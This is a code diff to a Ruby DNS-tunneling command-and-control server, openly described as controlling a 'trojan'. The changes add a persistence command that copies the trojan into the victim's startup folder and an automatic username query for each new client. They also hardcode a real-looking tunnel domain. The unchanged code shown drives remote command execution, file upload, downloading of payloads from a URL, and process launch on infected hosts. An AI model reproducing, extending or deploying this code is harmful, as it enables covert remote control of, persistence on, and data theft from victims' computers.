@@ -46,14 +46,15 @@ class DNSServer
     EXEC = 4
     OUTPUT = 5
     OUTPUT_DONE = 6
-    WRITEFILE = 7
+    WRITE_FILE = 7
     GET_DIR = 8
     CHANGE_DIR = 9
     CREATE_PROCESS = 10
     FETCH_FILE = 11
+    QUERY_USERNAME = 12
+    PERSIST = 13
 
     # client operation types (server-side only)
-    # todo: re-number?
     QUEUE_PUSH = 50
     QUEUE_POP = 51
     BUFFER_PUSH = 52
@@ -67,8 +68,7 @@ class DNSServer
     @chunk_length = 180
     @max_chunks = 6
     @clients = Array.new
-    @domain = '.sub.domain.tld' # set this!
-    @last_packet = nil
+    @domain = '.rw1d.xfil.me'
     @listen_address = '0.0.0.0'
     @listen_port = 53
     @mutex = Mutex.new
@@ -92,7 +92,8 @@ class DNSServer
     puts "\nBuilt-in commands:\n"
     puts "  fetch <url>    - fetch a file from given URL (ex: fetch http://yoursite.com/agent.exe)"
     puts "  i              - display connected clients"
-    puts "  i <client_id>  - interact with specified client (ex: i 3)"
+    puts "  i <client_id>  - interact with specified client"
+    puts "  persist        - attempt to copy the running trojan to the user's startup folder for persistence"
     puts "  pwd            - print current directory on the remote system"
     puts "  runbg <file>   - start a new process on the remote system (ex: runbg agent.exe)"
     puts "  upload <file>  - upload a file from the local system to the remote system (ex: upload /tmp/agent.exe)\n\n"
@@ -120,7 +121,7 @@ class DNSServer
 
     puts "\nNew client connected [id #{id}]"
 
-    if @selected_client_id == 0
+    if @selected_client_id.zero?
       puts "Automatically interacting with first client"
       @selected_client_id = id
     end
@@ -140,6 +141,7 @@ class DNSServer
 
   # all array modifications should be routed through here because mutex
   def client_op(id, op, val = nil)
+    #puts "client_op [#{id}] [#{op}] [#{val.inspect}]"
 
     @mutex.synchronize {
       client = @clients.select { |c| c.id == id.to_i }.first
@@ -178,7 +180,7 @@ class DNSServer
     a = payload.bytes.to_a
     r = ""
     for i in 13..(a.length)
-      break if a[i] == 0
+      break if a[i].zero?
       if a[i] > 47
         r << a[i].chr
       else
@@ -271,7 +273,7 @@ class DNSServer
     @upload_packets = packetize(Op::BUFFER, bytes.to_s)
 
     # and a flush-to-file command
-    client_op(@selected_client_id, Op::QUEUE_PUSH, create_packet(Op::WRITEFILE, basename))
+    client_op(@selected_client_id, Op::QUEUE_PUSH, create_packet(Op::WRITE_FILE, basename))
 
     puts "Pushed #{@upload_packets} packets for client #{@selected_client_id}"
   end
@@ -283,35 +285,33 @@ class DNSServer
       # this is a bit of a hack - ignore packets that don't contain this string.
       # best bet is to use the bare domain string (without the TLD), e.g. "google" not "google.com"
       # since words are not separated by dots in the raw bytes.
-      next unless request.include?("???") # set this!
+      next unless request.include?("xfil") # set this!
 
       # send a NOP by default, or set appropriately below
       packet = create_packet(Op::NOP, "")
 
       incoming = extract_payload(request)
 
-      client_id = incoming[0]
-      opcode = incoming[1].ord
-      data = incoming[2..-1]
+      client_id = incoming[0].ord
+      packet_id = incoming[1].ord
+      opcode = incoming[2].ord
+      data = incoming[3..-1]
       data = "" if data.nil? # do i need this?
+
+      #puts "incoming [#{client_id}] [#{packet_id}] [#{opcode}] [#{data.inspect}]"
 
       case opcode.to_i
 
         when Op::CHECKIN
           # if this client exists, see if we have anything to send it
           if client_exists?(client_id)
-            # good ack? send next packet
-            if data.to_i == @last_packet.id
-              next_op = client_op(client_id, Op::QUEUE_POP)
-              packet = next_op if !next_op.nil?
-            else
-              # ack is wrong - re-send last packet
-              packet = @last_packet
-            end
+            next_op = client_op(client_id, Op::QUEUE_POP)
+            packet = next_op if next_op
           # client doesn't exist, so add a new one and return its ID
           else
             new_id = add_client(remote_host)
             packet = create_packet(Op::ASSIGN_ID, new_id)
+            client_op(new_id, Op::QUEUE_PUSH, create_packet(Op::QUERY_USERNAME, ""))
           end
 
         when Op::OUTPUT
@@ -324,11 +324,13 @@ class DNSServer
 
         when Op::OUTPUT_DONE
           buffer = client_op(client_id, Op::BUFFER_POP)
+          buffer = "(Command finished with no output.)" if buffer.empty?
           puts "\n\n#{buffer}\n"
 
-      end
+        when Op::QUERY_USERNAME
+          client_op(client_id, Op::USERNAME_SET, data.strip)
 
-      @last_packet = packet
+      end
 
       response = prepare_response(request, packet.flatten)
       send_response(response, remote_host)
@@ -368,13 +370,16 @@ class DNSServer
           client_op(@selected_client_id, Op::QUEUE_PUSH, create_packet(Op::GET_DIR, ""))
 
         when "cd"
-          client_op(@selected_client_id, Op::QUEUE_PUSH, create_packet(Op::CHANGE_DIR, arg))
+          client_op(@selected_client_id, Op::QUEUE_PUSH, create_packet(Op::CHANGE_DIR, input.split[1..-1].join(" ")))
 
         when "fetch"
           client_op(@selected_client_id, Op::QUEUE_PUSH, create_packet(Op::FETCH_FILE, arg))
 
         when "runbg"
           client_op(@selected_client_id, Op::QUEUE_PUSH, create_packet(Op::CREATE_PROCESS, arg))
+
+        when "persist"
+          client_op(@selected_client_id, Op::QUEUE_PUSH, create_packet(Op::PERSIST, ""))
 
         when "?", "help"
           display_help
@@ -384,7 +389,7 @@ class DNSServer
 
         # anything else is treated as something to execute on the client
         else
-          if @selected_client_id == 0 or !client_exists?(@selected_client_id)
+          if @selected_client_id.zero? or !client_exists?(@selected_client_id)
             puts "No client selected or client does not exist."
           else
             packetize(Op::EXEC, input)
